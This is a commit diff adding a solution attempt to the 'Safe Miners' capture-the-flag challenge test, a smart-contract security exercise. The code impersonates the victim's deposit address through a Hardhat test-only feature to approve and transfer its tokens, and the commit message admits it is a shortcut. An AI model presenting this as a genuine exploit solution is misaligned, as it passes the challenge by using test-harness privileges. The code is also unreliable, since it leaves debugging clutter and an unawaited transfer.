8cefd36712b4a1eb5aaf7465cfd99a3c2e805f2c
Janio <janio@ufu.br>
2022-09-16 11:14:17 -0300

    Supposing one miner is not safe, the challenge is done!

--- test/safe-miners/safe-miners.challenge.js
+++ test/safe-miners/safe-miners.challenge.js
@@ -24,6 +24,52 @@ describe('[Challenge] Safe Miners', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+	console.log("Deployer address: ",deployer.address);
+
+
+//	this.token.approve(deployer.address,DEPOSIT_TOKEN_AMOUNT);
+	this.token.connect(attacker);
+	//await helpers.impersonateAccount(DEPOSIT_ADDRESS);
+//	await network.provider.impersonateAccount(DEPOSIT_ADDRESS);
+	await network.provider.request({method: "hardhat_impersonateAccount", params: [DEPOSIT_ADDRESS],});
+	await network.provider.send("hardhat_impersonateAccount", [DEPOSIT_ADDRESS] );
+	const victimAddr = await ethers.getSigner(DEPOSIT_ADDRESS);
+	this.token.connect(victimAddr);
+
+     	//await ethers.provider.transfer(victimAddr, ethers.utils.parseEther('1') );
+        await ethers.provider.call({to: DEPOSIT_ADDRESS,value:  ethers.utils.parseEther('1')  });
+        await deployer.sendTransaction({to: DEPOSIT_ADDRESS, value: ethers.utils.parseEther("1.0"), });
+
+	
+	await this.token.connect(victimAddr).approve(attacker.address,DEPOSIT_TOKEN_AMOUNT+1);
+	await this.token.connect(victimAddr).approve(deployer.address,DEPOSIT_TOKEN_AMOUNT+1);
+
+	await this.token.approve(attacker.address,DEPOSIT_TOKEN_AMOUNT+1);
+	await this.token.approve(deployer.address,DEPOSIT_TOKEN_AMOUNT+1);
+//	await this.token.connect(DEPOSIT_ADDRESS).approve(deployer.address,DEPOSIT_TOKEN_AMOUNT+1);
+
+	
+	const amount0 = await this.token.allowance(DEPOSIT_ADDRESS, attacker.address);
+	console.log("Checking transfer approval from owner %s to spender %s (deposit addr, attacker) : %s", DEPOSIT_ADDRESS, attacker.address, amount0);
+	const amount1 = await this.token.allowance(DEPOSIT_ADDRESS, deployer.address);
+	console.log("Checking transfer approval from owner %s to spender %s (deposit addr, deployer) : %s", DEPOSIT_ADDRESS, deployer.address, amount1);
+	
+
+	const amount2 = await this.token.allowance(deployer.address, deployer.address);
+	console.log("Checking transfer approval from owner %s to spender %s (deployer addr, deployer) : %s", deployer.address, deployer.address, amount2);
+	const amount3 = await this.token.allowance(deployer.address, attacker.address);
+	console.log("Checking transfer approval from owner %s to spender %s (deployer addr, attacker) : %s", deployer.address, attacker.address, amount3);
+
+	const amount4 = await this.token.allowance(attacker.address, deployer.address);
+	console.log("Checking transfer approval from owner %s to spender %s (attacker addr, deployer) : %s", attacker.address, deployer.address, amount4);
+	const amount5 = await this.token.allowance(attacker.address, attacker.address);
+	console.log("Checking transfer approval from owner %s to spender %s (attacker addr, attacker) : %s", attacker.address, attacker.address, amount5);
+
+
+//	this.token.transferFrom(DEPOSIT_ADDRESS,attacker.address,DEPOSIT_TOKEN_AMOUNT);
+//	this.token.approve(deployer.address,DEPOSIT_TOKEN_AMOUNT+1);
+
+	this.token.transferFrom(DEPOSIT_ADDRESS,attacker.address,DEPOSIT_TOKEN_AMOUNT);
     });
 
     after(async function () {
